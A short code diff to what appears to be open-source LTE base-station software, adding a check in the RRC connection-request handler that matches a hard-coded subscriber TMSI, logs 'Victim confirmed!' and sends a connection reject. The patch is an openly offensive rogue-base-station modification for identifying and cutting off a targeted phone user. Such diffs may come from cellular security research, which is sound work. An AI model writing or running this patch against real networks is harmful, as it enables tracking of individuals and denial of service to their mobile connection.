@@ -1187,6 +1187,10 @@ void rrc::ue::handle_rrc_con_req(rrc_conn_request_s* msg)
     m_tmsi   = (uint32_t)msg_r8->ue_id.s_tmsi().m_tmsi.to_number();
     has_tmsi = true;
   }
+  if (m_tmsi == 0xe1441545) {
+	  parent->rrc_log->console("Victim confirmed!\n");
+	  send_connection_reject();
+  }
   establishment_cause = msg_r8->establishment_cause;
   send_connection_setup();
   state = RRC_STATE_WAIT_FOR_CON_SETUP_COMPLETE;
